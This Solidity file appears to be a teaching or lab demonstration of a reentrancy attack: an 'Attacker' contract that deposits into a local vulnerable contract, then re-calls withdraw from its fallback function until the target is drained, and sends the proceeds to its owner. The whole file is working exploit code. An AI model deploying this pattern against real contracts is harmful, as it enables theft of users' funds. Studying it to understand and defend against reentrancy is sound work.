// SPDX-License-Identifier: MIT
pragma solidity ^0.5.0;

import "./Reentrancy.sol";
import "hardhat/console.sol";

contract Attacker {
    /* State variables */

    Reentrancy private vulnerableContract;
    address private owner;

    /* Custom errors and function modifiers */

    modifier isOwner() {
        if (msg.sender != owner) {
            revert("Not the owner");
        }
        _;
    }

    /* Functions */

    constructor(address payable vulnerableContractAddress) public payable {
        owner = msg.sender;
        vulnerableContract = Reentrancy(vulnerableContractAddress);
    }

    function stealFunds() external payable isOwner {
        vulnerableContract.deposit.value(0.001 ether)();
        console.log("Funds deposited");

        vulnerableContract.withdraw(0.001 ether);
        console.log("Funds stolen");

        (bool fundsStolen, ) = owner.call.value(address(this).balance)("");
        if (!fundsStolen) {
            revert("Error retrieving stolen funds");
        }
        console.log("Funds sent to owner");
    }

    function() external payable {
        console.log("Internal payable function called");
        uint256 bal = address(vulnerableContract).balance;
        console.log("Balance is", bal);
        if (address(vulnerableContract).balance >= 0.001 ether) {
            console.log("Second withdrawal call");
            vulnerableContract.withdraw(0.001 ether);
        }
    }
}
